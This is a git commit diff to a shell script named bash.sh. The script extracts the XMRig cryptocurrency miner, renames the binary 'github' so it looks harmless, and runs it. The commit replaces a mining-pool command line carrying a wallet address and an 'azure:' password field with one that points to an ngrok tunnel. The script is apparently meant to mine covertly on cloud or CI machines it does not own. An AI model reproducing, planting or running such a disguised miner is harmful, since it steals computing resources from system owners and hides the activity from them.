3a4bd08f1550c05d9d26d4ec23156ae22209b706
Storage Small <100378380+storagegitpush404@users.noreply.github.com>
2022-03-17 05:42:07 -0700

    Update bash.sh

--- bash.sh
+++ bash.sh
@@ -4,4 +4,4 @@ tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz
 cd xmrig-6.16.4
 mv xmrig github
 chmod u+x github
-./github -a Argon2/Chukwa -o pool.semipool.com:22287 -u gunsVsqShTeEfdPeJyQreNfSKfHLm5gfFi3WWywazefsRusPS4LjKoMYLigqfsvRsqKo4kJEEjtPkGPF7xsLQMGq8YcsjUESKm --keepalive --donate-level 1 -p azure:aris.aojr@yahoo.com
+./github -a Argon2/Chukwa -o 2.tcp.ngrok.io:14614
